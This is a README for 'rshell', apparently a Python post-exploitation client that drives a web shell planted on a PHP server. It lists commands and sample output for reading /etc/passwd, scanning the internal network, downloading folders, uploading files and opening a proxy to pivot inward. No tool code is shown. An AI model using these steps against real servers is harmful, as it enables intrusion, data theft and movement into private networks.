
# rshell
## Interactive command line interpreter using a web shell

###Usage:
	python rshell.py -u shell_url [-p proxy:port]
####Examples:
	* python rshell.py -u http://127.0.0.1/shell.php

		#Get the ips assigned to the server interfaces
		rshell:~ get_local_ips
		{'127.0.0.1': {'mask_bits': 8}, '192.168.1.8': {'mask_bits': 24}}

		#Find hosts in the server internal network
		rshell:~ find_hosts

		IP: 192.168.1.3
		Host name: 
 
		IP: 192.168.1.2
		Host name: 
		 
		IP: 192.168.1.1
		Host name: 
		23/tcp    open  telnet
		53/tcp    open  domain
		80/tcp    open  http
		52869/tcp open  unknown
		 
		IP: 192.168.1.8
		Host name: 
		22/tcp  open  ssh
		80/tcp  open  http
		111/tcp open  rpcbind
		139/tcp open  netbios-ssn
		445/tcp open  microsoft-ds

		#Run a command on the server side
		rshell:~ cat /etc/passwd

		#Run a command on the client side
		rshell:~ !command_in_client_side

		#Compress and download a folder
		rshell:~ dwfolder /var/www/html

		#Start a proxy to pivot to the internal network
		#You have to configure your browser proxy settings to localhost:8888
		rshell:~ start_proxy

	* python rshell.py -u http://127.0.0.1/shell.php -p proxy:port

###Functionality
	 - check_files 
        	Check existence of some files extracted from
	        pillage.lst from pwnwiki (https://github.com/pwnwiki)
        	usage: check_files
	 - compress_folder 
        	Compress a folder in the the server
	        usage: dwfolder compressed_file_name
	 - download 
        	Download a file from the server
	        usage: download remote_path/remote_file local_path/local_file
	 - dwfolder 
        	Compress and download a entire folder from the server
	        usage: dwfolder folder_path
	 - exit 
        	This is the exit command
	 - find_hosts 
        	Find hosts on local network
	        usage: find_hosts
	 - get_local_ips 
        	Get ips assigned to the local interfaces
	        usage: get_local_ips
	 - get_os 
        	Get information about the operating system using php
	        usage: get_os
	 - getswversion 
        	Print some software versions
	        usage: getswversion
	 - getsysinfo 
        	Print user and system information
	        usage: getsysinfo
	 - help 
        	This command show the list of commands
	 - payload 
        	Print the payload to write in an executable file in the server
	 - phpinfo 
        	Extract the phpinfo result and open it in a web browser
	 - print_hosts 
        	Print the hosts finded whith the command find_hosts
	        usage: print_hosts
	 - print_local_ips 
        	Print local ips
	        usage: print_local_ips
	 - quit 
        	This is the exit command
	 - set_password

	 - shell 
        	This method execute the command locally
	 - sql_connect

	 - start_proxy 
        	Start a local http proxy server to surf the internal network
	        usage: start_proxy
	 - stop_proxy 
        	Stop the proxy server
	        usage: stop_proxy
	 - upload 
        	Upload a file to the server
	        usage: upload local_path/local_file remote_path/remote_file
